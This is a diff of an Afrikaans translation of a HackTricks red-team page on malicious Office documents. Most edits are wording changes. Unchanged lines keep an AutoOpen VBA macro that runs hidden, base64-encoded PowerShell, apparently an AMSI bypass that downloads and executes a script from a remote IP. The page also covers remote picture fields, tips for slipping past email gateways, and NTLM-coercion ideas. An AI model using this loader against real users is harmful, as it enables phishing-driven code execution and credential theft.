@@ -4,7 +4,7 @@
 
 <summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy by 'n **cybersekuriteitsmaatskappy**? Wil jy hê dat jou **maatskappy geadverteer word in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Werk jy by 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks-klere**](https://peass.creator-spring.com)
 * **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -14,7 +14,7 @@
 
 ## Kantoor Dokumente
 
-Microsoft Word voer lêerdata-validasie uit voordat 'n lêer geopen word. Data-validasie word uitgevoer in die vorm van datastruktuuridentifikasie, teen die OfficeOpenXML-standaard. As enige fout tydens die datastruktuuridentifikasie voorkom, sal die geanaliseerde lêer nie geopen word nie.
+Microsoft Word voer lêerdata-validering uit voordat 'n lêer geopen word. Data-validering word uitgevoer in die vorm van datastruktuuridentifikasie, teen die OfficeOpenXML-standaard. As enige fout tydens die datastruktuuridentifikasie voorkom, sal die geanaliseerde lêer nie geopen word nie.
 
 Gewoonlik gebruik Word-lêers wat makro's bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul makro-uitvoeringsvermoëns te behou.\
 Byvoorbeeld, 'n RTF-lêer ondersteun nie makro's, volgens ontwerp nie, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees om makro-uitvoering uit te voer.\
@@ -24,19 +24,16 @@ Jy kan die volgende bevel gebruik om te kontroleer watter uitbreidings deur somm
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-```afrikaans
-DOCX-lêers wat na 'n afgeleë sjabloon verwys (Lêer -Opsies -Byvoegings -Bestuur: Sjablone -Gaan) wat makros insluit, kan ook makros "uitvoer".
-
 ### Eksterne Beeldlading
 
 Gaan na: _Invoeg --> Vinnige Dele --> Veld_\
 _**Kategorieë**: Skakels en Verwysings, **Veldname**: includePicture, en **Lêernaam of URL**:_ http://\<ip>/whatever
 
-![](<../../.gitbook/assets/image (152).png>)
+![](<../../.gitbook/assets/image (155).png>)
 
 ### Makro's Agterdeur
 
-Dit is moontlik om makros te gebruik om willekeurige kode vanuit die dokument uit te voer.
+Dit is moontlik om makro's te gebruik om willekeurige kode vanuit die dokument uit te voer.
 
 #### Outomatiese laai funksies
 
@@ -45,8 +42,7 @@ Hoe algemener hulle is, hoe waarskynliker is dit dat die AV hulle sal opspoor.
 * AutoOpen()
 * Document\_Open()
 
-#### Makro's Kodevoorbeelde
-```
+#### Makro's Kode Voorbeelde
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -80,9 +76,9 @@ proc.Create "powershell <beacon line generated>
 
 Gaan na **Lêer > Inligting > Inspekteer Dokument > Inspekteer Dokument**, wat die Dokument Inspekteerder sal oopmaak. Klik op **Inspekteer** en dan op **Verwyder Alles** langs **Dokumenteienskappe en Persoonlike Inligting**.
 
-#### Dok Uitbreiding
+#### Dok Extensie
 
-Wanneer jy klaar is, kies **Stoor as tipe**-keuslys, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
+Wanneer klaar, kies **Stoor as tipe**-keuslys, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
 Doen dit omdat jy **nie makro's binne 'n `.docx` kan stoor nie** en daar is 'n **stigma** **rondom** die makro-geaktiveerde **`.docm`**-uitbreiding (bv. die duimnael-ikoon het 'n groot `!` en sommige web/e-pos hekke blokkeer hulle heeltemal). Daarom is hierdie **oudtydse `.doc`-uitbreiding die beste kompromie**.
 
 #### Skadelike Makro's Opgewek
@@ -152,7 +148,7 @@ self.close
 ```
 ## Afdwing van NTLM-verifikasie
 
-Daar is verskeie maniere om **NTLM-verifikasie "op afstand" af te dwing**, byvoorbeeld, jy kan **onsigbare afbeeldings** by e-posse of HTML voeg wat die gebruiker sal oopmaak (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **verifikasie sal veroorsaak** net vir **die oopmaak van die vouer.**
+Daar is verskeie maniere om **NTLM-verifikasie "op afstand" af te dwing**, byvoorbeeld, jy kan **onsigbare afbeeldings** by e-posse of HTML voeg wat die gebruiker sal benader (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **verifikasie** sal **trigger** net vir **die oopmaak van die vouer.**
 
 **Kyk na hierdie idees en meer op die volgende bladsye:**
 
@@ -173,10 +169,10 @@ Moenie vergeet dat jy nie net die has of die verifikasie kan steel nie, maar ook
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
